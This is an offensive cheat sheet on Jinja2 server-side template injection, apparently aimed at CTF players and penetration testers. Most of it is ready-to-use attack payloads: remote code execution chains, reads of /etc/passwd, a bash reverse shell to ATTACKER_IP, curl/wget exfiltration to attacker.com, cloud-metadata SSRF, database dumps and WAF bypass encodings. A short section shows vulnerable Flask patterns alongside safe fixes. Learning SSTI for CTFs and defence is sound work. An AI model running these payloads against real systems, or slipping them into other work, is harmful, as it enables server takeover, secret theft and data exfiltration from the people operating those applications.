# SSTI - Jinja2 (Python) Deep Dive

## Quick Reference

| Object | Path to RCE | Notes |
|--------|------------|-------|
| `cycler` | `cycler.__init__.__globals__.os.popen('id').read()` | Cleanest, shortest |
| `lipsum` | `lipsum.__globals__.os.popen('id').read()` | Very reliable |
| `joiner` | `joiner.__init__.__globals__.os.popen('id').read()` | Alternative |
| `namespace` | `namespace.__init__.__globals__.os.popen('id').read()` | Alternative |
| `config` | `config.__class__.__init__.__globals__['os'].popen('id').read()` | Flask only |
| `request` | `request.application.__globals__.__builtins__.__import__('os').popen('id').read()` | Flask only |

**Quick Detection:**
```python
{{7*7}}      → 49          (SSTI confirmed)
{{7*'7'}}    → 7777777     (Jinja2 confirmed)
{{config}}   → Flask config (Flask confirmed)
```

---

## What is Jinja2 SSTI?

Jinja2 is the most popular Python templating engine, used by Flask, Ansible, and many other frameworks. It runs in a sandbox by default — but Python's object model makes that sandbox escapable, leading to full RCE.

**Impact:**
- 🔓 Full Remote Code Execution via Python object introspection
- 📂 Read arbitrary files without needing OS access directly
- 🔑 Dump Flask config, secrets, session keys, and env variables
- 💀 Reverse shell, SSRF chaining, DB access — all possible post-exploitation

---

## Python Object Model (Why This Works)

Every Python object exposes its class hierarchy and globals — even inside a sandbox. This is the core of all Jinja2 exploitation.

```python
''.__class__                        # <class 'str'>
''.__class__.__mro__                # Method Resolution Order
''.__class__.__mro__[1]             # <class 'object'> — the root of everything
''.__class__.__mro__[1].__subclasses__()  # ALL loaded classes in memory
some_class.__init__.__globals__     # Module-level globals of that class
```

**The exploit chain:**
1. Start from any string/list/dict/object
2. Walk up to `object` via `__mro__`
3. Get all subclasses loaded in memory
4. Find one with `os`, `__builtins__`, or `sys` in its `__globals__`
5. Call `popen()` or `__import__()` → RCE

---

## Exploitation Methods

### Method 1: cycler / lipsum / joiner (Cleanest)
These are Jinja2 built-in globals — always available, no index hunting needed:
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

### Method 2: config (Flask-specific)
```python
{{ config }}
{{ config.items() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Method 3: request (Flask-specific)
```python
{{ request }}
{{ request.__class__ }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Method 4: self.__init__.__globals__
```python
{{ self.__dict__ }}
{{ self.__init__.__globals__ }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Method 5: Subclass Enumeration (when globals blocked)
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ [].__class__.__base__.__subclasses__() }}
{{ {}.__class__.__base__.__subclasses__() }}

# Then target index with __globals__
{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

---

## RCE Payloads

**Execute commands:**
```python
{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
{{ lipsum.__globals__['os'].popen('ls -la /').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}
```

**Read files:**
```python
{{ cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
{{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
```

**List directory:**
```python
{{ cycler.__init__.__globals__.os.listdir('/') }}
{{ cycler.__init__.__globals__.os.popen('ls -la /').read() }}
```

**Reverse shell:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
```

**One-liner with GET param (great for CTFs):**
```python
{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}
# Trigger: ?cmd=cat /flag.txt
```

---

## Filter Bypasses

**Bypass `{{` and `}}`:**
```python
{% print(7*7) %}
{% print config %}
{%set x=7*7%}{{x}}
```

**Bypass quotes:**
```python
{{request.args.x}}         # Pass value via ?x=__class__
{{request.values.x}}       # Same via POST or GET
{{"__cla"+"ss__"}}         # String concat
```

**Bypass dots:**
```python
{{''['__class__']}}
{{''|attr('__class__')}}
{{''|attr('__class__')|attr('__mro__')}}
{{getattr(lipsum,'__globals__')}}
```

**Bypass underscores:**
```python
{{''['\x5f\x5fclass\x5f\x5f']}}       # Hex encoding
{{''['\u005f\u005fclass\u005f\u005f']}} # Unicode encoding
{{request.args.x}}                      # ?x=__class__
```

**Bypass blacklisted keywords (import, os, eval...):**
```python
{{lipsum.__globals__[('o'+'s')]}}
{{lipsum.__globals__[request.args.x]}}  # ?x=os
{{"__im"+"port__"}}
```

**WAF filter chain (confuse pattern matching):**
```python
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(104)}}
```

---

## Finding Useful Subclasses

Index numbers for `__subclasses__()` vary by Python version — always enumerate.

**Common useful indices:**

| Python Version | Index | Class |
|---------------|-------|-------|
| Python 2.7 | [40] | `file` |
| Python 2.7 | [59] | `warnings.catch_warnings` |
| Python 3.6+ | [104] | `warnings.catch_warnings` |
| Python 3.6+ | [117] | `os._wrap_close` |

**Search script to run locally:**
```python
for i, cls in enumerate([].__class__.__base__.__subclasses__()):
    try:
        if hasattr(cls.__init__, '__globals__'):
            g = cls.__init__.__globals__
            if 'os' in g:
                print(f"[{i}] {cls.__name__} — HAS os!")
            if '__builtins__' in g and '__import__' in g['__builtins__']:
                print(f"[{i}] {cls.__name__} — HAS __import__!")
    except:
        pass
```

---

## Blind SSTI & Advanced Chains

**Time-based detection (no output):**
```python
{% import time %}{{time.sleep(5)}}
```

**Out-of-band exfiltration:**
```python
{{ lipsum.__globals__.os.popen('curl http://attacker.com/?d=$(cat /flag.txt)').read() }}
{{ lipsum.__globals__.os.popen('wget --post-data="$(cat /flag.txt)" http://attacker.com').read() }}
```

**SSTI + SSRF (cloud metadata):**
```python
{{ lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/').read() }}
```

**SSTI + DB access:**
```python
{{ lipsum.__globals__.os.popen("mysql -u root -e 'SELECT * FROM users'").read() }}
```

**url_for (alternative Flask vector):**
```python
{{ url_for.__globals__.os.popen('cat /etc/passwd').read() }}
```

---

## Exploitation Workflow

**Step 1:** Inject `{{7*7}}` — if output is `49`, SSTI is confirmed.

**Step 2:** Inject `{{7*'7'}}` — if output is `7777777`, engine is Jinja2.

**Step 3:** Try `{{config}}` to confirm Flask and see exposed secrets.

**Step 4:** Try the cleanest built-in vectors: `cycler`, `lipsum`, `joiner`.

**Step 5:** Access `__globals__` and verify `os` is reachable: `{{lipsum.__globals__.os}}`.

**Step 6:** Execute `id`/`whoami` to confirm RCE: `{{cycler.__init__.__globals__.os.popen('id').read()}}`.

**Step 7:** Read the flag: `{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}`.

**Step 8:** If blocked — apply filter bypasses (hex, attr(), request.args, string concat).

---

## Common Vulnerable Patterns

**Pattern 1 — Flask f-string in render_template_string:**
```python
# ❌ Vulnerable
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template_string(f"Hello {name}")

# ✅ Safe
return render_template_string("Hello {{ name }}", name=name)
```

**Pattern 2 — Dynamic template construction:**
```python
# ❌ Vulnerable
template = "Dear " + user_input + ", your order is ready."
rendered = env.from_string(template).render()

# ✅ Safe
rendered = env.from_string("Dear {{ name }}, your order is ready.").render(name=user_input)
```

**Pattern 3 — Error messages echoing input:**
```python
# ❌ Vulnerable
return render_template_string(f"Error: {request.args.get('msg')}")
```

**Pattern 4 — Email/notification templates with raw input:**
```python
# ❌ Vulnerable
subject_template = f"Hello {username}, your invoice is ready"
render(subject_template)
```

---

## CTF / Practical Tips

**Read flag:**
```python
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
{{ lipsum.__globals__.__builtins__.open('/flag.txt').read() }}
{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}
```

**Check environment variables:**
```python
{{ cycler.__init__.__globals__.os.environ }}
{{ lipsum.__globals__.os.environ['FLAG'] }}
```

**Dynamic command via GET param:**
```python
{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}
# ?cmd=cat /flag.txt
# ?cmd=ls -la /
# ?cmd=env
```

**Common CTF scenarios:**
- ⚠️ Flag in `/flag.txt`, `/flag`, `/root/flag.txt`, or as env var `FLAG`
- ⚠️ WAF blocks `_` — use `\x5f` hex encoding or `request.args`
- ⚠️ WAF blocks `.` — use `|attr()` filter or `[]` notation
- ⚠️ WAF blocks `{{` — use `{%print(...)%}` or `{%set x=...%}{{x}}`
- ⚠️ No output — use OOB exfil via `curl` or `wget` with flag as GET param
- ⚠️ Subclass indices wrong — run the search script locally against same Python version

**Jinja2 built-in objects always available:**
`config`, `request`, `session`, `g`, `lipsum`, `cycler`, `joiner`, `namespace`, `dict`, `url_for`, `get_flashed_messages`

---

## Key Takeaways

✅ Jinja2's sandbox is escapable via Python's object model — `__mro__`, `__subclasses__()`, and `__globals__` are the core chain.

✅ `cycler` and `lipsum` are the shortest, cleanest RCE paths — no index hunting needed.

✅ When one object is blocked, there are 10+ alternatives: `joiner`, `namespace`, `config`, `request`, `url_for`, `self`...

✅ Most WAF bypasses rely on `request.args` (out-of-band input), `|attr()` (no dots), and hex/unicode encoding (no underscores).

✅ Always check env variables — CTF flags are frequently stored in `os.environ` rather than files.